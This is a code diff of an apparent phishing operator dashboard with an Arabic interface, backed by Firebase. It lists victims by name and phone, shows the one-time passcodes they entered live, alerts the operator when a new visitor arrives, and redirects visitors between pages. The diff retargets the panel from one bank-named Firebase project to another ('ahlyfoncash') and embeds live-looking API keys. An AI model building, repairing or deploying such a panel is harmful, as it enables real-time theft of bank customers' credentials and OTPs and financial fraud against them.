@@ -612,14 +612,13 @@
   import { getDatabase, ref, onValue, update, remove, get } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
   const firebaseConfig = {
-    apiKey: "AIzaSyBeHm-fcDyytoNQA25B9OQXA1HlOJvkabg",
-    authDomain: "masraf-alaman.firebaseapp.com",
-    databaseURL: "https://bank-alaman-default-rtdb.firebaseio.com",
-    projectId: "masraf-alaman",
-    storageBucket: "masraf-alaman.firebasestorage.app",
-    messagingSenderId: "783217104937",
-    appId: "1:783217104937:web:b7fa518b3503ff2ed22438",
-    measurementId: "G-WYCXRCET1R"
+    apiKey: "AIzaSyAyYxWRrSj2h2Nm2fQppKkJTG41S5EHtpI",
+    authDomain: "ahlyfoncash.firebaseapp.com",
+    projectId: "ahlyfoncash",
+    storageBucket: "ahlyfoncash.firebasestorage.app",
+    messagingSenderId: "894614445162",
+    appId: "1:894614445162:web:e51e3d1541d9cae2067e13",
+    measurementId: "G-0DG92LWJJT"
   };
 
   const app = initializeApp(firebaseConfig);
@@ -709,7 +708,6 @@
   // ===== RENDER SIDEBAR =====
   function renderSidebar() {
     const list = document.getElementById('visitorList');
-    // Sort: has pending action first, then by lastAction desc
     const sorted = Object.entries(sessions).sort((a, b) => {
       const aAction = ['waiting','otp_submitted'].includes(a[1].status);
       const bAction = ['waiting','otp_submitted'].includes(b[1].status);
@@ -741,13 +739,11 @@
       cb.dataset.id = id;
       cb.onclick = (e) => { e.stopPropagation(); updateSelCount(); };
       div.insertBefore(cb, div.firstChild);
-      // Prevent click on item when in selection mode
       const origOnclick = div.onclick;
       div.onclick = (e) => { if (document.body.classList.contains('selection-mode')) { cb.checked = !cb.checked; updateSelCount(); } else if (origOnclick) origOnclick(e); };
       list.appendChild(div);
     });
 
-    // Stats
     const all = Object.values(sessions);
     document.getElementById('statTotal').textContent = all.length;
     document.getElementById('statWaiting').textContent = all.filter(s => ['waiting','otp_submitted'].includes(s.status)).length;
@@ -771,7 +767,6 @@
 
     const showOTP = data.status === 'otp_submitted' && data.otp && data.otp !== '---';
 
-    // Build history
     const history = data.history || [];
     const historyHTML = history.slice().reverse().map(h => {
       const dotCls = h.type === 'reject' ? 'red' : h.type === 'action' ? 'orange' : h.type === 'otp' ? 'purple' : '';
@@ -782,7 +777,6 @@
       </div>`;
     }).join('');
 
-    // Pages dropdown
     const pagesOptions = PAGES.map(p =>
       `<option value="${p.value}">${p.label}</option>`
     ).join('');
@@ -805,7 +799,6 @@
 
         <div class="vb-body">
 
-          <!-- INFO GRID -->
           <div class="info-grid">
             <div class="info-item">
               <div class="label">الاسم</div>
@@ -842,13 +835,11 @@
             </div>` : ''}
           </div>
 
-          <!-- OTP DISPLAY -->
           <div class="otp-display ${showOTP ? 'show' : ''}">
             <div class="otp-label">🔢 رمز التحقق المُدخل من الزائر:</div>
             <div class="otp-value">${data.otp || '---'}</div>
           </div>
 
-          <!-- REDIRECT -->
           <div class="redirect-section">
             <label>🔀 إعادة توجيه الزائر إلى:</label>
             <div class="redirect-row">
@@ -860,7 +851,6 @@
             </div>
           </div>
 
-          <!-- ACTIONS -->
           <div class="actions-section">
             <div class="actions-title">⚡ الإجراءات</div>
 
@@ -892,7 +882,6 @@
             </div>
           </div>
 
-          <!-- HISTORY -->
           ${history.length > 0 ? `
           <div class="history-section">
             <div class="history-title">📜 سجل الإجراءات</div>
@@ -968,16 +957,14 @@
     onValue(ref(db, 'site1/sessions'), (snap) => {
       const data = snap.val() || {};
 
-      // Detect new visitors
       Object.keys(data).forEach(id => {
         if (!knownIds.has(id)) {
           knownIds.add(id);
-          if (knownIds.size > 1) { // skip first load
+          if (knownIds.size > 1) {
             playSound('new');
             showToast(`زائر جديد دخل الموقع: ${data[id].name || data[id].phone || 'مجهول'}`, 'new');
           }
         }
-        // Detect new actions
         if (knownStatuses[id] && knownStatuses[id] !== data[id].status) {
           const actionStatuses = ['waiting', 'otp_submitted'];
           if (actionStatuses.includes(data[id].status)) {
@@ -1015,60 +1002,59 @@
     sessions = {}; knownIds = new Set(); knownStatuses = {};
   }
 
-    // ===== CLEAR CHAT FUNCTIONS =====
-    window.toggleClearMenu = function(e, id) {
-      e.stopPropagation();
-      document.querySelectorAll('.clear-chat-menu').forEach(function(m) {
-        if (m.id !== 'clearMenu_' + id) m.classList.remove('open');
-      });
-      var menu = document.getElementById('clearMenu_' + id);
-      if (menu) menu.classList.toggle('open');
-    }
-    document.addEventListener('click', function() {
-      document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
+  // ===== CLEAR CHAT FUNCTIONS =====
+  window.toggleClearMenu = function(e, id) {
+    e.stopPropagation();
+    document.querySelectorAll('.clear-chat-menu').forEach(function(m) {
+      if (m.id !== 'clearMenu_' + id) m.classList.remove('open');
     });
+    var menu = document.getElementById('clearMenu_' + id);
+    if (menu) menu.classList.toggle('open');
+  }
+  document.addEventListener('click', function() {
+    document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
+  });
 
-    window.clearAllChats = function(sessionId) {
-      if (!confirm('هل أنت متأكد من مسح جميع المحادثات لهذه الجلسة؟')) return;
-      firebase.database().ref('site1/sessions/' + sessionId + '/messages').remove().then(function() {
-        document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
-        alert('تم مسح جميع المحادثات بنجاح');
-        renderDetail(sessionId);
-      });
-    }
-
-    window.enterSelectionMode = function() {
-      document.body.classList.add('selection-mode');
+  window.clearAllChats = function(sessionId) {
+    if (!confirm('هل أنت متأكد من مسح جميع المحادثات لهذه الجلسة؟')) return;
+    remove(ref(db, 'site1/sessions/' + sessionId + '/messages')).then(function() {
       document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
-      updateSelCount();
-    }
+      alert('تم مسح جميع المحادثات بنجاح');
+      renderDetail(sessionId);
+    });
+  }
 
-    function cancelSelection() {
-      document.body.classList.remove('selection-mode');
-      document.querySelectorAll('.vi-checkbox').forEach(function(cb) { cb.checked = false; });
-    }
+  window.enterSelectionMode = function() {
+    document.body.classList.add('selection-mode');
+    document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
+    updateSelCount();
+  }
 
-    function updateSelCount() {
-      var count = document.querySelectorAll('.vi-checkbox:checked').length;
-      var el = document.getElementById('selCount');
-      if (el) el.textContent = count + ' محدد';
-    }
+  window.cancelSelection = function() {
+    document.body.classList.remove('selection-mode');
+    document.querySelectorAll('.vi-checkbox').forEach(function(cb) { cb.checked = false; });
+  }
 
-    function deleteSelected() {
-      var checked = document.querySelectorAll('.vi-checkbox:checked');
-      if (checked.length === 0) { alert('لم تحدد أي جلسة'); return; }
-      if (!confirm('هل أنت متأكد من حذف ' + checked.length + ' جلسة؟')) return;
-      var promises = [];
-      checked.forEach(function(cb) {
-        promises.push(firebase.database().ref('site1/sessions/' + cb.dataset.id).remove());
-      });
-      Promise.all(promises).then(function() {
-        cancelSelection();
-        alert('تم الحذف بنجاح');
-      });
-    }
+  function updateSelCount() {
+    var count = document.querySelectorAll('.vi-checkbox:checked').length;
+    var el = document.getElementById('selCount');
+    if (el) el.textContent = count + ' محدد';
+  }
 
-  </script>
+  window.deleteSelected = function() {
+    var checked = document.querySelectorAll('.vi-checkbox:checked');
+    if (checked.length === 0) { alert('لم تحدد أي جلسة'); return; }
+    if (!confirm('هل أنت متأكد من حذف ' + checked.length + ' جلسة؟')) return;
+    var promises = [];
+    checked.forEach(function(cb) {
+      promises.push(remove(ref(db, 'site1/sessions/' + cb.dataset.id)));
+    });
+    Promise.all(promises).then(function() {
+      window.cancelSelection();
+      alert('تم الحذف بنجاح');
+    });
+  }
+
+</script>
 </body>
 </html>
-
